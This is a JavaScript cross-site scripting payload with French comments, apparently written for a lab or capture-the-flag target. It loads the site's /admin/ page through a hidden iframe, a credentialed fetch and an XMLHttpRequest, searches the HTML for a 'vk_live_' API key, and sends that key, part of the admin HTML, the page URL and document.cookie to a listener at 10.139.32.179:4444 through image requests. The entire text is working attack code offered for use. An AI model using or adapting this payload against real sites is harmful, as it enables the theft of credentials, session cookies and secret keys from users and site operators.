const listener = "http://10.139.32.179:4444";

// Fonction pour envoyer des données via Image (GET)
function exfil(data) {
    const img = new Image();
    img.src = listener + "/?d=" + encodeURIComponent(data.substring(0, 1000));
}

// Méthode 1: Utiliser un iframe pour charger /admin/ et extraire le contenu
const iframe = document.createElement('iframe');
iframe.src = '/admin/';
iframe.style.display = 'none';
iframe.onload = function() {
    try {
        const doc = iframe.contentDocument || iframe.contentWindow.document;
        const html = doc.documentElement.outerHTML;
        const match = html.match(/vk_live_[a-f0-9]{40}/);
        if (match) {
            exfil("API_KEY: " + match[0]);
        }
        exfil("ADMIN_HTML: " + html.substring(0, 500));
    } catch(e) {
        exfil("IFRAME_ERROR: " + e.message);
    }
};
document.body.appendChild(iframe);

// Méthode 2: Faire un fetch classique
fetch('/admin/', { credentials: 'include' })
    .then(r => r.text())
    .then(html => {
        const match = html.match(/vk_live_[a-f0-9]{40}/);
        if (match) {
            exfil("FETCH_API: " + match[0]);
        }
    })
    .catch(e => exfil("FETCH_ERROR: " + e.message));

// Méthode 3: Envoyer le document actuel (review.php)
exfil("CURRENT_URL: " + location.href);
exfil("COOKIES: " + document.cookie);
const bodyText = document.body ? document.body.innerText : '';
const keyInBody = bodyText.match(/vk_live_[a-f0-9]{40}/);
if (keyInBody) {
    exfil("BODY_API: " + keyInBody[0]);
}

// Méthode 4: Essayer via XMLHttpRequest avec tous les paramètres
const xhr = new XMLHttpRequest();
xhr.open('GET', '/admin/', true);
xhr.withCredentials = true;
xhr.onload = function() {
    const html = this.responseText;
    const match = html.match(/vk_live_[a-f0-9]{40}/);
    if (match) {
        exfil("XHR_API: " + match[0]);
    }
};
xhr.onerror = function() {
    exfil("XHR_ERROR");
};
xhr.send();
